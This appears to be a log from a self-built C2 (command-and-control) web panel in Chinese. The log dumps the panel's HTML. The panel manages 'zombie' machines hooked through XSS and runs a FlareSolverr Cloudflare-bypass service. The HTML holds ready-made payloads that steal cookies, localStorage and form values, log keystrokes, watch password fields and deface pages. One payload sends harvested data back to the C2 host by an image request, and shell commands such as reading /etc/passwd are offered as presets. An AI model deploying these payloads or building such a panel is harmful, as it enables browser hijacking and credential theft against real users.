class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T15:07:45.211Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 23:07:45.221365</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-26 23:07:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:45] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 23:07:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 23:07:49 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 23:07:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-26 23:07:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:07:49] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:08:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:08:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:08:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:08:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:08:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:08:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:09:43 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:09:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:09:43] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:09:59 | INFO     | flaresolverr_route.py:129 | stop_flaresolverr() | 收到停止 FlareSolverr 服務請求
2025-06-26 23:09:59 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 23:09:59 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 50340)
2025-06-26 23:09:59 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 23:09:59 | INFO     | flaresolverr_route.py:134 | stop_flaresolverr() | FlareSolverr 服務停止成功
2025-06-26 23:09:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:09:59] "POST /api/flaresolverr/stop HTTP/1.1" 200 -
2025-06-26 23:10:01 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:10:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:10:01] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:10:02 | INFO     | flaresolverr_route.py:104 | start_flaresolverr() | 收到啟動 FlareSolverr 服務請求
2025-06-26 23:10:02 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 23:10:11 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:10:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:10:11] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:10:25 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 23:10:25 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-26 23:10:25 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 23:10:25 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-26 23:10:25 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 23:10:25 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-26 23:10:25 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 23:10:25 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-26 23:10:25 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 23:10:25 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 52197
2025-06-26 23:10:47 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-26 23:10:47 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-26 23:10:47 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-26 23:10:47 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-26 23:10:47 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-26 23:10:47 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-26 23:11:02 | INFO     | flaresolverr_route.py:232 | flaresolverr_dashboard() | 載入 FlareSolverr 管理界面
2025-06-26 23:11:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:02] "GET /api/flaresolverr/dashboard HTTP/1.1" 200 -
2025-06-26 23:11:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:02] "[36mGET /static/css/vulnerability/vulnerability.css HTTP/1.1[0m" 304 -
2025-06-26 23:11:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:02] "[36mGET /static/js/vulnerability.js HTTP/1.1[0m" 304 -
2025-06-26 23:11:02 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:11:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:02] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 23:11:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:02] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:11:04 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 23:11:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:04] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 23:11:09 | INFO     | flaresolverr_route.py:25 | flaresolverr_solve() | 收到 FlareSolverr 解析請求
2025-06-26 23:11:09 | INFO     | flaresolverr_route.py:38 | flaresolverr_solve() | 開始處理 FlareSolverr 請求，URL: https://httpbin.org/get
2025-06-26 23:11:13 | INFO     | flaresolverr_route.py:79 | flaresolverr_solve() | FlareSolverr 解析成功
2025-06-26 23:11:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:13] "POST /api/flaresolverr/solve HTTP/1.1" 200 -
2025-06-26 23:11:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 23:11:38 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 23:11:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0240s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-26 23:11:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 23:11:38] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 23:29:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 23:29:49 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 23:29:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0117s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + 